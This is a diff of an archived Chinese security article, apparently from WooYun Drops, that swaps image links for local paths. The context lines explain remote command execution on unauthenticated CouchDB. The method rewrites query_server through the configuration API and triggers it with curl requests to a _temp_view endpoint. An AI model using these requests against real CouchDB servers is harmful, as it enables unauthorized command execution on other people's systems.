@@ -52,7 +52,7 @@ coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js
   <p>The CouchDB Server Configuration API provide an interface to query and update the various configuration values within a running CouchDB instance</p>
 </blockquote>
 
-<p><img src="http://static.wooyun.org//drops/20160518/2016051813382071701139.png" alt="" /></p>
+<p><img src="../image/drops/20160518/2016051813382071701139.png" alt="" /></p>
 
 <p>也就是说，除了<code>local.ini</code>的配置文件，CouchDB允许通过自身提供的<code>Restful API</code>接口动态修改配置属性。结合以上两点，<strong>我们可以通过一个未授权访问的CouchDB</strong>，通过修改其<code>query_server</code>配置，来执行系统命令。</p>
 
@@ -79,11 +79,11 @@ curl -X PUT 'http://1.1.1.1:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a2
 curl -X POST 'http://1.1.1.1:5984/vultest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160518/2016051813382396781227.png" alt="" /></p>
+<p><img src="../image/drops/20160518/2016051813382396781227.png" alt="" /></p>
 
 <p>执行后，可以看到，指定的命令已经成功执行：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160518/2016051813382510428315.png" alt="" /></p>
+<p><img src="../image/drops/20160518/2016051813382510428315.png" alt="" /></p>
 
 <p>至于如何回显执行结果，各位可以动动脑筋，欢迎互动。</p>
 
